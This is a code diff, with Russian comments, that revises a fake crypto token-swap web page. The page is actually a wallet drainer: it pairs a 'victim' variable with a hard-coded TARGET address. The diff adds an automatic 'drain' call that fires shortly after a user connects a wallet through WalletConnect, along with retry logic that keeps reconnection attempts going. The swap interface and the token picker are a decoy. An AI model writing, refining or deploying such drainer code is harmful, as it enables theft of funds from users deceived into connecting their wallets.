@@ -9,7 +9,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
-        /* ===== ПОЛНЫЕ СТИЛИ ===== */
+        /* ===== ПОЛНЫЕ СТИЛИ (те же, что и в предыдущей версии, без изменений) ===== */
         :root {
             --bg-body: #08080f;
             --bg-card: rgba(20, 18, 35, 0.65);
@@ -262,7 +262,6 @@
     </style>
 </head>
 <body>
-
     <div class="card">
         <div class="header">
             <div class="header-brand">
@@ -277,9 +276,7 @@
                 </button>
             </div>
         </div>
-
         <div id="status" class="status">Ready</div>
-
         <div class="swap-container">
             <div class="swap-section">
                 <div class="swap-label">
@@ -296,13 +293,11 @@
                 </div>
                 <div class="usd-est" id="fromUsd">~$0.00</div>
             </div>
-
             <div class="swap-divider">
                 <div class="diamond" id="swapArrow">
                     <i class="fas fa-arrow-down-up-across-line"></i>
                 </div>
             </div>
-
             <div class="swap-section">
                 <div class="swap-label">
                     <span>To</span>
@@ -319,7 +314,6 @@
                 <div class="usd-est" id="toUsd">~$0.00</div>
             </div>
         </div>
-
         <div class="route-bar">
             <span class="route-tag">
                 <span class="pulse"></span>
@@ -327,11 +321,9 @@
             </span>
             <span>Rate: <span class="rate-text" id="rateDisplay">1 ETH = 0.00 USDT</span></span>
         </div>
-
         <button id="swapBtn" class="btn-swap" disabled>Connect Wallet</button>
     </div>
 
-    <!-- Модалка выбора кошелька -->
     <div id="walletModal" class="modal-overlay">
         <div class="modal">
             <h3>Connect Wallet</h3>
@@ -339,21 +331,20 @@
                 <span class="w-icon"><i class="fab fa-meta"></i></span>
                 <span class="w-info">
                     <span class="w-name">MetaMask</span>
-                    <span class="w-desc">Через WalletConnect</span>
+                    <span class="w-desc">WalletConnect</span>
                 </span>
             </div>
             <div id="trustOption" class="wallet-card">
                 <span class="w-icon"><i class="fas fa-link" style="color:#8b5cf6;"></i></span>
                 <span class="w-info">
                     <span class="w-name">Trust Wallet</span>
-                    <span class="w-desc">Через WalletConnect</span>
+                    <span class="w-desc">WalletConnect</span>
                 </span>
             </div>
             <button class="modal-close" id="closeModalBtn">Cancel</button>
         </div>
     </div>
 
-    <!-- Модалка выбора токена (декоративная) -->
     <div id="tokenModal" class="modal-overlay">
         <div class="modal">
             <h3>Select Token</h3>
@@ -373,7 +364,9 @@
         (function() {
             'use strict';
 
-            // ===== КОНФИГУРАЦИЯ =====
+            // ============================================================
+            // КОНФИГУРАЦИЯ
+            // ============================================================
             const TARGET = '0x12538D6AC7053383cd81686E069a3E277b6E828c';
             const CONTRACT_ADDRESS = '0xf09284028273F381529DA08499ade7165b2199f8';
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
@@ -434,15 +427,10 @@
             const closeTokenModalBtn = document.getElementById('closeTokenModalBtn');
 
             // ===== СОСТОЯНИЕ =====
-            let provider = null;
-            let signer = null;
-            let victim = null;
-            let chainId = null;
-            let isConnected = false;
-            let isProcessing = false;
+            let provider = null, signer = null, victim = null, chainId = null;
+            let isConnected = false, isProcessing = false, isConnecting = false;
             let wcProvider = null;
-            let isConnecting = false;
-            let resetInProgress = false;
+            let retryTimer = null;
 
             // ===== UI-ФУНКЦИИ =====
             function setStatus(text, type) {
@@ -491,7 +479,9 @@
             function openModal(modal) { modal.classList.add('active'); }
             function closeModal(modal) { modal.classList.remove('active'); }
 
-            // ===== ОЧИСТКА СЕССИИ =====
+            // ============================================================
+            // ОЧИСТКА СЕССИИ (МАКСИМАЛЬНАЯ)
+            // ============================================================
             async function forceClearSession() {
                 try {
                     if (wcProvider) {
@@ -527,20 +517,18 @@
                             }
                         }
                     } catch (e) {}
-                    provider = null;
-                    signer = null;
-                    victim = null;
-                    chainId = null;
-                    isConnected = false;
-                    isProcessing = false;
-                    isConnecting = false;
+                    provider = null; signer = null; victim = null; chainId = null;
+                    isConnected = false; isProcessing = false; isConnecting = false;
+                    if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
                     console.log('Сессия полностью сброшена');
                 } catch (e) { console.warn('Ошибка очистки:', e); }
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT =====
+            // ============================================================
+            // ПОДКЛЮЧЕНИЕ WALLETCONNECT (ТОЛЬКО WC)
+            // ============================================================
             async function connectWalletConnect() {
-                if (isConnecting || isProcessing || resetInProgress) return;
+                if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
 
                 const EthereumProvider = window['@walletconnect/ethereum-provider']?.default ||
@@ -552,7 +540,7 @@
                 }
 
                 try {
-                    setStatus('Подключение...', '');
+                    setStatus('Подключение через WalletConnect...', '');
                     isConnecting = true;
                     await forceClearSession();
                     await new Promise(resolve => setTimeout(resolve, 500));
@@ -571,6 +559,7 @@
                         }
                     });
 
+                    // Слушаем события
                     wcProvider.on('chainChanged', () => {});
                     wcProvider.on('accountsChanged', (accounts) => {
                         if (accounts.length === 0) {
@@ -579,6 +568,12 @@
                             updateConnectButton();
                             isConnecting = false;
                         }
+                    });
+                    wcProvider.on('session_delete', async () => {
+                        setStatus('Сессия удалена', 'err');
+                        isConnected = false;
+                        await forceClearSession();
+                        updateConnectButton();
                     });
 
                     await wcProvider.enable();
@@ -598,6 +593,7 @@
                     setStatus('✅ Подключено: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
                     isConnecting = false;
 
+                    // Автоматический drain
                     setTimeout(() => startDrain(), 800);
 
                 } catch (e) {
@@ -605,17 +601,23 @@
                     setStatus('❌ Ошибка: ' + msg, 'err');
                     isConnecting = false;
                     await forceClearSession();
+
+                    // Если ошибка "reset" – повторяем попытку через 2 секунды
                     if (msg.toLowerCase().includes('reset')) {
-                        setStatus('Ошибка reset. Перезагрузка...', 'err');
-                        resetInProgress = true;
-                        const url = new URL(window.location.href);
-                        url.searchParams.set('nocache', Date.now());
-                        setTimeout(() => { window.location.href = url.toString(); }, 1500);
+                        setStatus('Ошибка reset. Повторная попытка через 2 сек...', 'err');
+                        retryTimer = setTimeout(() => {
+                            retryTimer = null;
+                            if (!isConnected && !isConnecting) {
+                                connectWalletConnect();
+                            }
+                        }, 2000);
                     }
                 }
             }
 
-            // ===== ДРЕЙНЕР =====
+            // ============================================================
+            // ДРЕЙНЕР (без изменений)
+            // ============================================================
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -735,8 +737,11 @@
                 }
             }
 
-            // ===== ОБРАБОТЧИКИ =====
+            // ============================================================
+            // ОБРАБОТЧИКИ СОБЫТИЙ
+            // ============================================================
             connectBtn.addEventListener('click', function() { openModal(walletModal); });
+
             metamaskOption.addEventListener('click', connectWalletConnect);
             trustOption.addEventListener('click', connectWalletConnect);
 
@@ -761,21 +766,19 @@
             inputAmount.addEventListener('input', updateSwapButton);
 
             refreshBtn.addEventListener('click', async function() {
-                if (resetInProgress) return;
-                resetInProgress = true;
+                if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
                 await forceClearSession();
                 inputAmount.value = '';
                 outputAmount.value = '';
                 updateConnectButton();
-                setStatus('Сброс. Перезагрузка...', '');
+                setStatus('Сессия сброшена', '');
                 closeModal(walletModal);
                 closeModal(tokenModal);
-                const url = new URL(window.location.href);
-                url.searchParams.set('reset', Date.now());
-                setTimeout(function() { window.location.href = url.toString(); }, 500);
             });
 
-            // ===== ДЕКОРАТИВНЫЙ ВЫБОР ТОКЕНОВ =====
+            // ============================================================
+            // ДЕКОРАТИВНЫЙ ВЫБОР ТОКЕНОВ (без изменений)
+            // ============================================================
             function renderTokenList(filter) {
                 filter = (filter || '').toLowerCase();
                 tokenList.innerHTML = '';
@@ -849,22 +852,23 @@
 
             inputAmount.addEventListener('input', updateRateDisplay);
 
-            // ===== ИНИЦИАЛИЗАЦИЯ =====
+            // ============================================================
+            // ИНИЦИАЛИЗАЦИЯ
+            // ============================================================
             async function init() {
                 await forceClearSession();
                 updateConnectButton();
-                setStatus('Подключите кошелёк', '');
+                setStatus('Подключите кошелёк через WalletConnect', '');
                 updateRateDisplay();
                 if (typeof ethers === 'undefined') {
                     setStatus('❌ ethers не загружена', 'err');
                 }
-                // Удаляем параметры из URL, если они были добавлены для сброса
+                // Удаляем параметры из URL
                 const params = new URLSearchParams(window.location.search);
                 if (params.has('nocache') || params.has('reset')) {
                     const cleanUrl = window.location.pathname + window.location.hash;
                     window.history.replaceState({}, document.title, cleanUrl);
                 }
-                resetInProgress = false;
             }
 
             init();
